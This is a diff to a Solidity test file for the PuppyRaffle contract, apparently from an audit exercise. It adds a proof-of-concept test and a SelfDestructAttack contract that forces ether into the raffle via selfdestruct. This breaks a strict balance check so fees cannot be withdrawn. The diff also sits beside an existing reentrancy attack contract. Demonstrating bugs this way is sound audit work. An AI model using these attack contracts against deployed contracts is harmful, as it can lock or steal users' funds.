@@ -232,6 +232,23 @@ contract PuppyRaffleTest is Test {
         assertEq(address(puppyRaffle).balance, 0);
         assertEq(address(attack).balance, entranceFee * 5);
     }
+
+    function test_srw_strict_equality_can_be_exploited_so_cant_withdraw_fees() 
+        public
+        playersEntered
+    {
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        puppyRaffle.selectWinner();
+
+        SelfDestructAttack attack = new SelfDestructAttack(puppyRaffle);
+        vm.deal(address(attack), 1 ether);
+        attack.attack();
+
+        vm.expectRevert();
+        puppyRaffle.withdrawFees();
+    }
 }
 
 contract ReentrancyAttack {
@@ -262,5 +279,18 @@ contract ReentrancyAttack {
             s_reentrancy_count -= 1;
             s_puppyRaffle.refund(s_indexOfPlayer);
         }
+    }
+}
+
+contract SelfDestructAttack 
+{
+    PuppyRaffle s_puppyRaffle;
+
+    constructor(PuppyRaffle puppyRaffle) {
+        s_puppyRaffle = puppyRaffle;
+    }
+
+    function attack() public {
+        selfdestruct(payable(address(s_puppyRaffle)));
     }
 }
